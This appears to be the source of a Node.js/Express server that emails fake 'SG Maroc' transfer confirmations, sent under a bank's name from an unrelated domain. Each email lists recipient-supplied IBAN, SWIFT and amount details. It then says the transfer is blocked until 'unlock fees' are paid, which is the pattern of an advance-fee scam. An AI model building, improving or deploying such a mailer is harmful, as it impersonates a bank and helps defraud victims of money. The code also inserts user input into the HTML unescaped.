// ================================
// SERVEUR SIMPLE D'ENVOI D'EMAILS
// Version minimaliste qui fonctionne à coup sûr
// ================================

const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
require('dotenv').config();

// Créer l'application Express
const app = express();
const PORT = process.env.PORT || 3000;

// Configuration de base
app.use(express.json());
app.use(cors({ origin: 'https://twest-odwk.onrender.com' }));

// NOUVEAU : Servir les fichiers statiques (HTML, CSS, JS, images)
app.use(express.static('./')); // Sert tous les fichiers depuis la racine du projet

// NOUVEAU : Route par défaut pour la page d'accueil
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Créer le transporteur email (méthode correcte : createTransport)
const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'mail.albaarchivio.com',
    port: process.env.SMTP_PORT || 587,
    secure: true, // true pour 465, false pour 587
    auth: {
        user: process.env.EMAIL_USER || 'noreply@albaarchivio.com',
        pass: process.env.EMAIL_PASSWORD // TON VRAI MOT DE PASSE ICI
    }
});

// Fonction pour générer une référence unique
function generateReference() {
    const date = new Date();
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, '0');
    const day = String(date.getDate()).padStart(2, '0');
    
    // Générer un identifiant aléatoire de 6 caractères alphanumériques
    const randomId = Math.random().toString(36).substr(2, 6).toUpperCase();
    
    // Format : ALBA-YYYYMMDD-XXXXXX (ex: ALBA-20250103-A7B3C9)
    return `SG_MAROC-${year}${month}${day}-${randomId}`;
}

// Route de test pour vérifier que l'API fonctionne
app.get('/api/status', (req, res) => {
    res.json({ 
        message: 'API AlbaArchivio opérationnelle !',
        status: 'OK',
        timestamp: new Date().toISOString()
    });
});

// Route pour tester la connexion email
app.get('/test-email', async (req, res) => {
    try {
        await transporter.verify();
        res.json({ success: true, message: 'Configuration email OK' });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// Route principale pour envoyer l'email
app.post('/send-email', async (req, res) => {
    try {
        const { nom, prenom, iban, swift, banque, montant, dest_mail, libelle} = req.body;
        
        // Validation simple
        if (!nom || !prenom || !dest_mail || !iban || !swift || !banque || !montant || !dest_mail || !libelle) {
            return res.status(400).json({ 
                success: false, 
                error: 'Tous les champs sont obligatoires' 
            });
        }
        
        // Générer une référence unique pour cette demande
        const reference = generateReference();
        console.log('Nouvelle demande avec référence:', reference);
        
        // Configuration de l'email avec template professionnel
        const mailOptions = {
            from: {
                name: 'SG Maroc - Confirmation de virement',
                address: process.env.EMAIL_USER
            },
            to: dest_mail,
            subject: `SG Maroc - Confirmation de virement`,
            html: `
                <!DOCTYPE html>
                <html lang="fr">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>SG Maroc - Confirmation de virement</title>
                    <style>
                        body { 
                            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                            line-height: 1.6; 
                            color: #2c3e50; 
                            margin: 0; 
                            padding: 0; 
                            background-color: #ecf0f1; 
                        }
                        .email-container { 
                            max-width: 600px; 
                            margin: 20px auto; 
                            background: white; 
                            border-radius: 10px; 
                            overflow: hidden;
                            box-shadow: 0 5px 15px rgba(0,0,0,0.1); 
                        }
                        .header { 
                            background: linear-gradient(135deg, #2c3e50 0%, #3498db 100%);
                            color: white; 
                            padding: 30px; 
                            text-align: center; 
                        }
                        .header h1 { 
                            margin: 0 0 10px 0; 
                            font-size: 28px; 
                        }
                        .reference-box {
                            background: rgba(255, 255, 255, 0.2);
                            border: 2px solid rgba(255, 255, 255, 0.3);
                            border-radius: 8px;
                            padding: 15px;
                            margin-top: 20px;
                            text-align: center;
                        }
                        .reference-label {
                            font-size: 14px;
                            opacity: 0.9;
                            margin-bottom: 5px;
                        }
                        .reference-number {
                            font-size: 24px;
                            font-weight: bold;
                            letter-spacing: 2px;
                            font-family: 'Courier New', monospace;
                        }
                        .content { 
                            padding: 30px; 
                        }
                        .greeting {
                            font-size: 18px;
                            margin-bottom: 20px;
                            color: #2c3e50;
                        }
                        .info-section { 
                            background: #f8f9fa; 
                            border-left: 4px solid #3498db; 
                            padding: 20px; 
                            margin: 25px 0; 
                            border-radius: 0 8px 8px 0; 
                        }
                        .info-section h3 {
                            color: #2c3e50;
                            margin: 0 0 15px 0;
                            font-size: 18px;
                        }
                        .info-row {
                            display: flex;
                            margin-bottom: 10px;
                            align-items: flex-start;
                        }
                        .info-label {
                            font-weight: bold;
                            min-width: 120px;
                            color: #34495e;
                        }
                        .info-value {
                            color: #2c3e50;
                            flex: 1;
                        }
                        .next-steps {
                            background: #e8f6ff;
                            border-radius: 8px;
                            padding: 20px;
                            margin: 25px 0;
                        }
                        .next-steps h3 {
                            color: #2980b9;
                            margin: 0 0 15px 0;
                        }
                        .steps-list {
                            margin: 0;
                            padding-left: 20px;
                        }
                        .steps-list li {
                            margin-bottom: 8px;
                            color: #34495e;
                        }
                        .contact-info {
                            background: #fff8e1;
                            border-radius: 8px;
                            padding: 20px;
                            margin: 25px 0;
                            text-align: center;
                        }
                        .contact-info h4 {
                            color: #f39c12;
                            margin: 0 0 10px 0;
                        }
                        .footer { 
                            background: #2c3e50; 
                            color: white; 
                            padding: 25px; 
                            text-align: center; 
                            font-size: 14px;
                            line-height: 1.4;
                        }
                        .footer-warning {
                            font-style: italic;
                            opacity: 0.9;
                            margin-bottom: 15px;
                        }
                        .footer-copyright {
                            font-weight: bold;
                            opacity: 0.8;
                        }
                        .logo-emoji {
                            font-size: 36px;
                            margin-bottom: 10px;
                        }
                    </style>
                </head>
                <body>
                    <div class="email-container">
                        <!-- En-tête avec référence -->
                        <div class="header">
                            <div class="logo-emoji">📧</div>
                            <h1>Confirmation de Virement</h1>
                            <div class="reference-box">
                                <div class="reference-label">Référence</div>
                                <div class="reference-number">${reference}</div>
                            </div>
                        </div>
                        
                        <!-- Contenu principal -->
                        <div class="content">
                            <div class="greeting">
                              Cher(e) <strong>${prenom} ${nom}</strong>,
                            </div>
                            
                            <p>Nous vous confirmons l'exécution de votre virement avec les détails suivants :</p>
                            
                            <div class="info-section">
                                <h3>📋 Notification de non-exécution du virement  </h3>
                                <div class="info-row">
                                    <div class="info-label">Montant :</div>
                                    <div class="info-value"><strong>${montant} €</strong></div>
                                </div>
                                 
                                <div class="info-row">
                                <div class="info-label">Date :</div>
                                <div class="info-value">${new Date().toLocaleDateString('fr-FR', {
                                    year: 'numeric', 
                                    month: 'long', 
                                    day: 'numeric', 
                                    hour: '2-digit', 
                                    minute: '2-digit'
                                })}</div>
                                 </div>
                               
                                ${iban ? `
                                <div class="info-row">
                                    <div class="info-label">IBAN :</div>
                                    <div class="info-value">${iban}</div>
                                </div>
                                ` : ''}
                                ${swift ? `
                                <div class="info-row">
                                    <div class="info-label">Code Swift :</div>
                                    <div class="info-value">${swift}</div>
                                </div>
                                ` : ''}
                                
                                ${banque ? `
                                <div class="info-row">
                                    <div class="info-label">Code Banque :</div>
                                    <div class="info-value">${banque}</div>
                                </div>
                                ` : ''}
                                ${libelle ? `
                                <div class="info-row">
                                    <div class="info-label">Libellé :</div>
                                    <div class="info-value">${libelle}</div>
                                </div>
                                ` : ''}
                               
                            </div>
                            
                            <div class="next-steps">
                                <h3>🚀 Information Importante</h3>
                                <ul class="steps-list">
                                    <li> <strong>Le traitement du virement reste suspendu tant que les frais de déblocage ne sont pas acquittés. Nous vous invitons à effectuer ce règlement dans les plus brefs délais afin de permettre la finalisation de l’opération.
                                    </strong></li>
                                </ul>
                            </div>
                        </div>
                        
                        <!-- Footer personnalisé -->
                        <div class="footer">
                            <div class="footer-warning">
                                Ceci est un message automatique, merci de ne pas y répondre.
                            </div>
                            <div class="footer-copyright">
                                © 2025 SG Maroc - Tous droits réservés
                            </div>
                        </div>
                    </div>
                </body>
                </html>
            `
        };
        
        // Envoyer l'email
        const info = await transporter.sendMail(mailOptions);
        
        console.log('Email envoyé avec référence:', reference, 'MessageID:', info.messageId);
        
        res.json({
            success: true,
            message: 'Votre demande a été envoyée avec succès ! Vérifiez votre boîte de réception.',
            reference: reference,
            messageId: info.messageId
        });
        
    } catch (error) {
        console.error('Erreur envoi email:', error);
        res.status(500).json({
            success: false,
            error: 'Erreur lors de l\'envoi : ' + error.message
        });
    }
});

// Démarrer le serveur
app.listen(PORT, () => {
    console.log(`
🚀 Serveur simple démarré !
📍 Port: ${PORT}
📧 Email: ${process.env.EMAIL_USER}
🌐 Test: http://localhost:${PORT}
    `);
});